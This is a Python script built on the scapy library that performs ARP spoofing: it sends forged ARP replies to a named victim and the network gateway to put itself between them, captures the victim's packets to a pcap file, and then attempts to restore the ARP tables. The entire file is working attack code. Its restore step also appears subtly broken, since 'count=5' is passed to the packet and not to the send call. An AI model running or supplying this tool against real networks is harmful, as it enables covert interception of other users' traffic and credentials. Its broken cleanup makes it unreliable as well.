from multiprocessing import Process
from scapy.all import ARP, Ether, conf, send, sniff, srp, wrpcap
import sys
import time

def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=targetip)
    resp, _ = srp(packet, timeout=2, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface='wlan0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0 

        print("-" * 30)
        print("In Class Arper")
        print("-" * 30)
        print(f"Initialized :: {interface}")
        print(f"Gateway {gateway} :: {self.gatewaymac}")
        print(f"Victim {victim} :: {self.victimmac}")
        print("-" * 30)
        print("")

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        poison_victim.hwsrc = self.gatewaymac

        print("-" * 30)
        print("In the Poison")
        print("-" * 30)
        print(f"Ip src :: {poison_victim.psrc}")
        print(f"Ip dst :: {poison_victim.pdst}")
        print(f"Mac dst :: {poison_victim.hwdst}")
        print(f"Mac src :: {poison_victim.hwsrc}")
        print(poison_victim.summary())
        print("-" * 30)
        print("")

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        poison_gateway.hwsrc = self.victimmac

        print("-" * 30)
        print("In the Gateway")
        print("-" * 30)
        print(f"Ip src :: {poison_gateway.psrc}")
        print(f"Ip dst :: {poison_gateway.pdst}")
        print(f"Mac dst :: {poison_gateway.hwdst}")
        print(f"Mac src :: {poison_gateway.hwsrc}")
        print(poison_gateway.summary())
        print("-" * 30)
        print("")

        print("Beginning the ARP Poison...")
        while True:
            try:
                sys.stdout.write(".")
                sys.stdout.flush()
                send(poison_victim, verbose=False)
                send(poison_gateway, verbose=False)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=1000):
        time.sleep(5)
        print(f"Sniffing {count} packets....")
        bpf_filter = f"ip host {self.victim}"
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap("arper.pcap", packets)
        print("Got the packets ....")
        self.restore()
        self.poison_thread.terminate()
        print("Finished")
    
    def restore(self):
        print("Restoring ARP tables....")
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff',
            count=5
        ), verbose=False)
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff',
            count=5
        ), verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python script.py <victim_ip> <gateway_ip> <interface>")
        sys.exit(1)

    victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
    myarp = Arper(victim, gateway, interface)
    myarp.run()
